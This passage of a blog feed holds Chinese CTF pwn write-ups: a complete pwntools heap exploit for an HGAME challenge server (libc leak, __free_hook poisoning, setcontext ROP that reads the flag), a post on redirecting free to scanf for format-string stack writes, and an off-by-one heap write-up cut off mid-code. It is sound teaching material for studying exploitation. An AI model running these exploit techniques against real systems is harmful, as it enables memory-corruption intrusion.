class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30475</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">rdi2rdx=lb+<span class="number">0x000000000014b760</span></span><br><span class="line">setcontext=lb+<span class="number">0x5306D</span></span><br><span class="line">ret=lb+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi=lb+<span class="number">0x000000000002858f</span></span><br><span class="line">pop_rsi=lb+<span class="number">0x000000000002ac3f</span></span><br><span class="line">pop_rdx_r12=lb+<span class="number">0x0000000000114161</span></span><br><span class="line">pop_rax=lb+<span class="number">0x0000000000045580</span></span><br><span class="line">syscall=lb+<span class="number">0x00108D55</span></span><br><span class="line">read=lb+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=lb+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">heap=key*<span class="number">0x1000</span>+<span class="number">0x1f0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(rdi2rdx))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(heap))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">1</span>)*<span class="number">15</span>+p64(heap+<span class="number">0xc0</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap+<span class="number">0x10</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap+<span class="number">0x28</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(setcontext))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h2><h3 id="without-look"><a href="#without-look" class="headerlink" title="without_look"></a>without_look</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/16387344.html">house of apple  by Lynne</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;复健。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
    <category term="house_of_botcake" scheme="http://example.com/tags/house-of-botcake/"/>
    
  </entry>
  
  <entry>
    <title>scanf_attacker？</title>
    <link href="http://example.com/2022/09/02/scanf-hijacker/"/>
    <id>http://example.com/2022/09/02/scanf-hijacker/</id>
    <published>2022-09-02T01:55:51.000Z</published>
    <updated>2023-01-18T11:51:32.893Z</updated>
    
    <content type="html"><![CDATA[<p>一切都源于某个中午的突发奇想~</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png" style="zoom:80%;" /><span id="more"></span><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>众所周知，在较低的<code>libc</code>版本（2.34之前）下进行<code>orw</code>利用一般是把<code>__free_hook</code>劫持为<code>setcontext</code>进行栈迁移（现在还需要跳板<code>gadget</code>完成<code>rdx</code>到<code>rdi</code>的转变），堆的各项布局对于我这个想寄就寄的菜鸟来说真是心力憔悴。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128154/12/29279/36057/63116848Ea2f34b05/b991a211c9e5b641.jpg" style="zoom: 33%;" /><p>转念一想<code>free(buf)</code>中的<code>buf</code>是人为可控的，<code>free</code>也可以由<code>__free_hook</code>被劫持为某个函数。刚好当时国赛出题出的就是有关格式化字符串<code>printf</code>和<code>scanf</code>的漏洞利用，就有了这样的想法——<code>free(buf)</code>===&gt;<code>scanf(buf)</code>，其中<code>buf</code>堆块中存放着<code>%n$s</code>来对准<code>rbp</code>链在函数返回地址处直接构造<code>orw</code>。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/47026/25/21037/41527/63116b98Eb9f9e80a/f3f24576b5844d4a.jpg" style="zoom: 25%;" /><h2 id="scanf格式化字符串漏洞"><a href="#scanf格式化字符串漏洞" class="headerlink" title="scanf格式化字符串漏洞"></a>scanf格式化字符串漏洞</h2><p>利用<code>scanf(%n$s)</code>可以对偏移为<code>n</code>的栈上<strong>指针</strong>指向处进行<strong>任意长度</strong>的输入。常见利用手法有：</p><ol><li>栈上若残留<code>IO</code>指针可进行<code>IO_ATTACK</code>泄露<code>libc</code></li><li>利用<code>rbp</code>链构造<code>rop</code>，直接避开了<code>rbp</code>链前的<code>canary</code></li></ol><h2 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h2><p>于是兴致勃勃地跑去用<a href="https://anza2001.github.io/2022/08/14/off-by-one/">上次刚复盘过的题目</a>进行试验：</p><p>下图为已劫持<code>__free_hook</code>为<code>scanf</code>，正在尝试执行<code>scanf(&#39;%8$s&#39;)</code>操作（8为<code>rbp</code>链的偏移）：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/192749/27/27723/89623/63117202E1841821f/2f6f248266f3fff7.png" style="zoom:80%;" /><p>送些垃圾数据过去，看一下栈的变化：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/215319/40/20778/119453/631173b3Ea84ff058/050099a11809f7d9.png" style="zoom:80%;" /><p>可以看到我们成功利用<code>rbp</code>链将<code>main</code>函数栈的返回地址给覆盖为了<code>anzaanza</code>，加上<code>scanf</code>也不会被<code>\x00</code>截断，所以直接构造<code>orw</code>并非难事。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><p>省去了对堆块的布局操作以及寻找<code>rdx</code>和<code>rdi</code>转变的<code>gadget</code>，简化为只需要爆破出固定偏移即可。</p></li><li><p>上次复盘时感觉<code>setcontext</code>和<code>orw</code>链需要在一个较大的堆块中进行布局，如果所给堆块较小的话，大概会提高利用的复杂程度（第一次利用<code>setcontext</code>解题，经验不足，可能是拙见）。而<code>scanf</code>可输入不限长，对参数堆块<code>buf</code>的大小也不做限制。</p></li><li><p>如果题目允许，则可不断申请、释放？相当于无限次格式化字符串漏洞（不论劫持为<code>scanf</code>还是<code>printf</code>），可以在栈上构造想要的地址，然后对其指向处进行修改等操作？</p></li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>试验过程中我们知道，在<code>delete</code>功能函数中利用<code>scanf</code>格式化漏洞利用只能修改到其<strong>父函数</strong>即<code>main</code>函数的返回地址，而许多题目都是直接<code>exit</code>退出了，不给<code>main</code>函数返回的机会。</li><li>会被<code>\x0a</code>截断，对<code>rop</code>链有要求。</li><li>大概更适用于<code>orw</code>，毕竟不开沙箱的话直接构造<code>system(&#39;/bin/sh&#39;)</code>就好。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><code>scanf(buf)</code>和<code>system(buf)</code>都是控制函数和其第一个参数，而后者被<code>sandbox</code>之后，前者还有用武之地（除非<code>orw</code>白名单）。不知能否配合<code>io_file</code>之类的利用手法，以及搭配起来是否比原解法更方便。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一切都源于某个中午的突发奇想~&lt;/p&gt;
&lt;img src=&quot;https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png&quot; style=&quot;zoom:80%;&quot; /&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://example.com/2022/08/14/off-by-one/"/>
    <id>http://example.com/2022/08/14/off-by-one/</id>
    <published>2022-08-14T01:07:26.000Z</published>
    <updated>2023-02-01T14:32:42.273Z</updated>
    
    <content type="html"><![CDATA[<p>赛前复盘一道<code>libc2.31</code>的<code>off-by-one</code>漏洞利用的题目。</p><span id="more"></span><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>特殊的堆溢出漏洞，只溢出一个字节，从而影响下一个堆块的头部控制信息，即堆块的<code>size</code>位，利用思路往往是<strong>改大</strong>下一个堆块的<code>size</code>位，从而造成<strong>堆块重叠</strong>(overlapping)。</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>将下一个堆块改大(一般改成<strong>unsortedbin</strong>的大小)后进行<strong>释放</strong>，利用<code>unsortedbin</code>中堆块可切割的性质，造成堆块重叠，同时可以泄露出<code>main_arena+96</code>。参考图如下：</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/9162/38/19492/69695/62f87050E2853f706/edc2658491d52f8a.png"></p><h3 id="Gadget：setcontext"><a href="#Gadget：setcontext" class="headerlink" title="Gadget：setcontext"></a>Gadget：setcontext</h3><p>首先来看下<code>libc-2.27.so</code>中的<code>setcontext</code>：</p><img src="https://m.360buyimg.com/babel/jfs/t1/180383/9/27781/74057/62f87b1dE171bf553/952ab3795b63fd6b.png" style="zoom:80%;" /><p>只要我们控制住<code>rdi</code>寄存器且保证<code>rdi+0A0</code>和<code>rdi+0A8</code>处<strong>人为可控</strong>，便能控制程序执行流。在<code>rdi+0A8</code>用<code>ret</code>指令进行覆盖，<code>rdi+0A0</code>处构造<code>ROP</code>链。而我们通常将<code>__free_hook</code>劫持为<code>setcontext+53</code>，而<code>free(heap_ptr)</code>前会将<code>rdi</code>写入<code>heap_ptr</code>，因此<code>rdi</code>也可控。</p><p>再来看下<code>libc-2.31.so</code>中的<code>setcontext</code>：</p><img src="https://m.360buyimg.com/babel/jfs/t1/27026/15/19442/63240/62f87f68E2355543e/3e7fd59d3eb7948a.png" style="zoom:80%;" /><p>我们发现寄存器由<code>rdi</code>改为了<code>rdx</code>，这就意味着我们需要寻找另一个<code>gadget</code>作为跳板，如下：</p><img src="https://m.360buyimg.com/babel/jfs/t1/164191/21/29805/50170/62f8818aE389bea14/7a9e50a788d86bc3.png" style="zoom:80%;" /><h2 id="赛题详解"><a href="#赛题详解" class="headerlink" title="赛题详解"></a>赛题详解</h2><p>赛题出自第二届广东大学生网络安全大赛——midpwn。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/pwnpwnpwn/Libc2.31Training/midpwn$ checksec orz</span><br><span class="line">[*] &#x27;/home/fuzz/pwnpwnpwn/Libc2.31Training/midpwn/orz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="基本功能模块"><a href="#基本功能模块" class="headerlink" title="基本功能模块"></a>基本功能模块</h3><p>典型的菜单题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add new note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delte a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit        .&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choose which one?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>add</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *heap; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= size0x20 )<span class="comment">//堆块上限为0x20</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = size0x20;</span><br><span class="line">      <span class="keyword">if</span> ( i == size0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no space left.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heap_ptr + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input note size : &quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x28</span> &amp;&amp; size != <span class="number">0xB0</span> )<span class="comment">//只允许申请0x28和0xb0大小的堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your size is too small or too big.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( heap &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;heap_ptr + i) = heap;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your note.&quot;</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, *(&amp;heap_ptr + i), size);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>edit</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input new note.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//读入size+1个字节，存在off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>show</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, heap_ptr[v1], heap_size[v1]);<span class="comment">//打印堆内数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>delete</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap_ptr[v1]);</span><br><span class="line">  heap_ptr[v1] = <span class="number">0LL</span>;<span class="comment">//释放堆块，并将指针置零</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本漏洞"><a href="#基本漏洞" class="headerlink" title="基本漏洞"></a>基本漏洞</h3><p><code>off-by-one</code>漏洞存在于<code>edit</code>功能中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ol><li>填满<code>tcache bin</code>中<code>0xc0</code>大小的堆块，使得下一块<code>0xc0</code>大小的堆块被释放后会进入<code>unsortedbin</code></li><li>申请6个<code>0x31</code>大小的堆块（第6个堆块用于防止unsortedbin大小堆块的合并）</li><li>用第1个堆块修改第二个堆块的<code>size</code>位为<code>0xc1</code>，再将第2个堆块释放掉，该堆块便能进入<code>unsortedbin</code></li><li>切割<code>unsortedbin</code>泄露出<code>libc</code>基址，并造成堆块重叠</li><li>利用堆块重叠，我们通过修改<code>fd</code>可以申请修改<code>__free_hook</code>为跳板<code>gadget</code>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001518B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001518B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001518B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><ol start="6"><li>申请回两个<code>0xb0</code>大小的堆块，对释放的堆块构造如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 